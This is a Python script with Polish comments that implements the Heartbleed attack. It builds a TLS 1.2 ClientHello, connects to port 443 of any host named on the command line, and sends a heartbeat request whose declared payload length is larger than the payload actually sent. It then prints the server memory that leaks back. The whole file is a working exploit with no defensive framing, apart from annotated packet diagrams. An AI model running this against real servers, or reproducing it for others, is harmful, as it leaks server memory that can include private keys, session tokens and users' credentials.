import sys
import socket
import struct
import select
import array

#Struktura nagłówka
# 0                   1                   2                   3  
# 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#|      Type     |        TLS Version            |  Packet .......
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#.... Length     |    Msg Type   |           Message .............         
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#...... Length   |      Client TLS Version       |   Client .....           
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#........................ Random                 |Session ID Len |
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#|       Cipher Suite Length     |          Cipher Suites        |
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#|       Compression Methods     |         Extension Length      |
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

clientHello = (
    0x16,                       #Typ: Rekord uzgadniania
    0x03, 0x03,                 #Wersja TLS: 1.2
    0x00, 0x2f,                 #Długość pakietu 47B
    0x01,                       #Typ wiadomości: Client Hello
    0x00, 0x00, 0x2b,           #Długość wiadomości 43B
    0x03, 0x03,                 #Wersja TLS Klienta 1.2
                                #Wartość losowa (jednorazowa)
    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x00, 0x01,
    0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x03, 0x04,
    0x05, 0x06, 0x07, 0x08, 0x09, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18,

    0x00,                       #Długość identyfikatora sesji
    0x00, 0x02,                 #długość zestawu szyfrów: 2B
    0x00, 0x2f,                 #Szyfr TLS_RSA_WITH_AES128_CBC_SHA
    0x01, 0x00,                 #Kompresja: długość 0x1B i 0x00
    0x00, 0x00,                 #Rozmiar roszczerzenia: 0, Bez rozszerzeń
)

SERVER_HELLO_DONE = 14 #0x0e

def recv_all(socket, length):
    response = b''
    total_bytes_remaining = length
    while total_bytes_remaining > 0:
        readable, writeable, error = select.select([socket], [], [])
        if socket in readable:
            data = socket.recv(total_bytes_remaining)
            response += data
            total_bytes_remaining -= len(data)
    return response

def readPacket(socket):
    headerLength = 6
    payload = b''
    header = recv_all(socket, headerLength)
    print(header.hex(" "))
    if header != b'':
        type, version, length, msgType = struct.unpack('>BHHB', header)
        if length > 0:
            payload += recv_all(socket, length - 1)
    else:
        print("Response has no header")
    return type, version, payload, msgType

#struktura pakietu Heartbeat
# 0                   1                   2                   3  
# 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#|      Type     |             Version           | Packet Length..
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#.............   |    Req/Resp   |         Payload Length        |
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#|                             payload                           |
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heartbeat = (
    0x18,            #Typ: heartbeat
    0x03, 0x03,      #Wersja 1.2
    0x00, 0x03,      #Rozmiar 3B
    0x01,            #Żądanie Heartbeat
    0x00, 0x40       #Rozmiar 64KB
)

def readServerHeartBeat(socket):
    payload = b''
    for i in range(0, 4):
        type, version, packet_payload, msgType = readPacket(socket)
        payload += packet_payload
    return (type, version, payload, msgType)

def exploit(socket):
    HEART_BEAT_RESPONSE = 21 #0x15
    payload = b''
    socket.send(array.array('B', heartbeat))
    print("Sent Heartbeat")
    type, version, payload, msgType = readServerHeartBeat(socket)
    if msgType == HEART_BEAT_RESPONSE :
        print(payload.decode('utf-8'))
    else:
        print("No heartbeat received")
    socket.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], 443))
    s.send(array.array('B',clientHello))
    serverHelloDone = False
    while not serverHelloDone:
        type, version, payload, msgType = readPacket(s)
        if (msgType == SERVER_HELLO_DONE):
            serverHelloDone = True
    exploit(s)

if __name__ == "__main__":
    main()